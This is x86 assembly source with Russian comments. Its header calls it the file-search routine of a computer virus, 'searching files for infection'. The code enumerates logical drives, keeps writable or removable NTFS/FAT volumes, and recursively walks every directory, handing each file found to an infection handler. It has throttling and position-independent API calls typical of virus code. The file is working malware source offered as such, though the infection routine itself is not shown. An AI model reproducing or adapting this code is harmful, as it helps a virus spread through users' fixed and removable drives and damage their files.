; ============================================================================
;	search_files_all.asm
;
;	алгоритм поиска файлов для заражения
;	реализация для поиска всех файлов на R/W дисках
;
; 	last change :: 29.10.2007
;
; ============================================================================



; ============================================================================================	
; in			:  ebx - base
; 			:  [scan_type = 0] - производится скан всех дисков
; 			:  [scan_type = 1] - производится скан только REMOVABLE дисков
; out		:  
; action		:  шуршит по дискам
; changes	:  nithing
process_drives	proc	scan_type:dword
		LOCAL		drive_name[4]:BYTE
	
		pushad
		
		mov			drive_name[1], ':'
		mov			drive_name[2], '\'
		mov			drive_name[3], 0

		ke32_call	GetLogicalDrives
		test		eax, eax
		jz			__process_drives_end
		
		mov			ecx, eax			; в ecx - битовая маска найденных логических дисков
		mov			dl, 'A'
		
__process_drives_rotate_loop:
	; цикл перебора дисков ;диск А пропускается
		; выйти, если основной поток завершён
		cmp			[offset main_thread_end_event + ebx], 1
		je			__process_drives_end

		cmp			dl, 'Z'
		jz			__process_drives_end

		inc			dl
		shr			ecx, 1

		bt			ecx, 0				; проверка, существует ли такой диск в системе
		jnc			__process_drives_rotate_loop

		mov			drive_name[0], dl

		lea			eax, drive_name
		push		eax					; параметр для проверки на возможность обработки - ссылка на путь
		
		cmp			scan_type, SCAN_ALL_DRIVES
		jne			__process_drives_removable
		call		is_drive_rw
		jmp			__process_drives_test
__process_drives_removable:
		cmp			scan_type, SCAN_REMOVABLE_DRIVES
		jne			__process_drives_end
		call		is_drive_removable
__process_drives_test:
		test		eax, eax
		jz			__process_drives_rotate_loop

		lea			eax, drive_name
		push		eax					; параметр process_directory - ссылка на путь
		call		process_directory

		jmp			__process_drives_rotate_loop		

__process_drives_end:
		popad
		ret
process_drives	endp
; ============================================================================================





; ============================================================================================	
; in			:  ebx - base
;			:  drive - смещение ASCIIZ-строки, содержащей имя диска
; out		:  [eax = 1] - раздел пригоден для поиска файлов
;			:  [eax = 0] - раздел не пригоден для поиска файлов
; action		:  проверяет раздел на пригодность к поиску файлов для заражения
; changes	:  eax
is_drive_rw	proc	drive:DWORD
		LOCAL		result:DWORD

		pushad

		mov			result, 0

		push		drive			; LPCTSTR lpRootPathName
		ke32_call	GetDriveTypeA

		cmp			eax, DRIVE_CDROM
		je			__is_drive_rw_end
		cmp			eax, 1				; DRIVE_NO_ROOT_DIR
		je			__is_drive_rw_end
		cmp			eax, 0				; DRIVE_UNKNOWN											! need optimize
		je			__is_drive_rw_end

		push		drive
		call		check_drive_fs
		test		eax, eax
		jz			__is_drive_rw_end
		
		mov			result, 1

__is_drive_rw_end:
		popad
		mov			eax, result
		ret
is_drive_rw	endp
; ============================================================================================





; ============================================================================================	
; in			:  ebx - base
;			:  drive - смещение ASCIIZ-строки, содержащей имя диска
; out		:  [eax = 1] - диск REMOVABLE и (NTFS or FAT)
;			:  [eax = 0] - диск не REMOVABLE или REMOVABLE, но не (NTFS or FAT)
; action		:  проверяет, является ли диск REMOVABLE и (NTFS or FAT)
; changes	:  eax
is_drive_removable	proc	drive:DWORD
		LOCAL		result:DWORD

		pushad

		mov			result, 0

		push		drive			; LPCTSTR lpRootPathName
		ke32_call	GetDriveTypeA

		cmp			eax, DRIVE_REMOVABLE
		jne			__is_drive_removable_end

		push		drive
		call		check_drive_fs
		test		eax, eax
		jz			__is_drive_removable_end

		mov			result, 1

__is_drive_removable_end:
		popad
		mov			eax, result
		ret
is_drive_removable	endp
; ============================================================================================





; ============================================================================================	
; in			:  ebx - base
;			:  drive - смещение ASCIIZ-строки, содержащей имя диска
; out		:  [eax = 1] - диск (NTFS or FAT)
;			:  [eax = 0] - диск не (NTFS or FAT)
; action		:  проверяет, является ли диск (NTFS or FAT)
; changes	:  eax
check_drive_fs	proc	drive:DWORD
		LOCAL		result:DWORD
		LOCAL		file_system_name_buffer[FILE_SYSTEM_NAME_BUFFER_LENGHT]:BYTE

		pushad

		mov			result, 0

		push		FILE_SYSTEM_NAME_BUFFER_LENGHT	; DWORD nFileSystemNameSize
		lea			eax, file_system_name_buffer
		push		eax								; LPTSTR lpFileSystemNameBuffer
		xor			eax, eax
		push		eax ; push 0						; LPDWORD lpFileSystemFlags						! need optimize
		push		eax	; push 0						; LPDWORD lpMaximumComponentLength
		push		eax	; push 0						; LPDWORD lpVolumeSerialNumber
		push		eax	; push 0						; DWORD nVolumeNameSize
		push		eax	; push 0						; LPTSTR lpVolumeNameBuffer
		push		drive							; LPCTSTR lpRootPathName
		ke32_call	GetVolumeInformationA
		test		eax, eax
		jz			__check_drive_fs_end

		lea			esi, file_system_name_buffer
		mov			byte ptr [esi + 3], 0
		mov			eax, dword ptr [esi]
		cmp			eax, "FTN"
		je			__check_drive_fs_success
		cmp			eax, "TAF"
		jne			__check_drive_fs_end

__check_drive_fs_success:
		mov			result, 1

__check_drive_fs_end:
		popad
		mov			eax, result
		ret
check_drive_fs	endp
; ============================================================================================





; ============================================================================================	
; in			:  ebx - base
;			:  path - смещение ASCIIZ-строки, содержащей имя директории, которую надо обработать
; out		:  nothing
; action		:  ищет в текущей директории файлы и вызывает для них обработчик
; 			:  рекурсивно вызывает себя для обработки подкаталоков
; changes	:  nothing
process_directory	proc	path:DWORD
		LOCAL 		param_len:DWORD
		LOCAL 		search_path:DWORD
		local		search_path_size:dword
		LOCAL		search_result:WIN32_FIND_DATA
		LOCAL 		find_handle:DWORD
		LOCAL		path_and_name:DWORD
		LOCAL		path_and_name_size:DWORD

		pushad

IF	SLEEP_IN_EACH_DIR
		push		SLEEP_IN_EACH_DIR_PERIOD
		ke32_call	Sleep
ENDIF

		; добавляем слеш к пути в параметре
		push		path
		call		add_backslash

		; считаем длину переданного буфера
		push		path
		call		str_len
		mov			param_len, eax
		add			param_len, 3		; учитываем, что к переданному пути придётся добавить "*" и нулевой символ, а также "/" при рекурсивном вызове

	; копируем полученный в параметре путь и добавляем в него маску поиска
		; выделяем необходимую память в стеке
		mov			eax, param_len
		mov			edx, 04h
		call		align_up
		sub			esp, eax
		mov			search_path, esp			; указатель на выделенную под хранение пути поиска строку
		mov			search_path_size, eax
		; копируем в выделенную память
		push		search_path		; to
		push		path			; from	
		call		str_cpy
		; добавляем звёздочку к локальной копии
		push		search_path
		call		add_star


		; искать по заданному в search_path критерию функцией FindFirstFileA
		lea			eax, search_result
		push		eax									; LPWIN32_FIND_DATA lpFindFileData
		push		search_path							; LPCTSTR lpFileNamе
		ke32_call	FindFirstFileA
		cmp			eax, INVALID_HANDLE_VALUE 			; что-то найдено?
		jz			__process_directory_alloc_free		; если нет - валим отсюда
		mov			find_handle, eax					; сохранить хэндл поиска

__process_directory_process_find_results:
	; выйти, если основной поток завершён
		cmp			[offset main_thread_end_event + ebx], 1
		je			__process_directory_find_close
	; обработка результатов поиска и либо рекурсивный вызов, либо проверка файла
		; отбрасываем . и ..
		lea			esi, search_result.cFileName
		cmp			byte ptr [esi], '.'
		je			__process_directory_find_next
		; выделяем место в стеке под склеивание результата поиска и пути
		push		esi
		call		str_len
		add			eax, param_len	; в eax - длина строки, которая вместит путь и имя найденного
		mov			edx, 04h
		call		align_up
		sub			esp, eax
		mov			path_and_name, esp
		mov			path_and_name_size, eax
		; склеиваем путь и имя найденного
		push		path_and_name	; dest
		push		esi				; str2
		push		path			; str1
		call		conc_str
		; запихиваем склеенную строку в стек для обработки в качетве...
		push		path_and_name		
		; директории?
		mov			eax, search_result.dwFileAttributes
		and			eax, FILE_ATTRIBUTE_DIRECTORY
		jz			__process_directory_process_file
		; да, директории
		call		process_directory
		jmp			__process_directory_free_local_alloc
__process_directory_process_file:
		; нет, файла
		call		process_file
__process_directory_free_local_alloc:
		; высвобождение стека
		add			esp, path_and_name_size

__process_directory_find_next:		
		; продолжить искать по хэндлу, возвращённому функцией  FindFirstFileA c помощью функции  FindNextFileA
		lea			eax, search_result
		push		eax									; LPWIN32_FIND_DATA lpFindFileData
		push		find_handle							; HANDLE hFindFile
		ke32_call	FindNextFileA
		test		eax, eax									; найдено ли что-то?
		jnz			__process_directory_process_find_results	; если да - обработать

		; закрыть хэндл поиска
__process_directory_find_close:		
		push		find_handle			; HANDLE hFindFile
		ke32_call	FindClose
		
		
__process_directory_alloc_free:
		; высвобождение стека
		add			esp, search_path_size

__process_directory_end:
		popad
		ret
process_directory	endp
; ============================================================================================
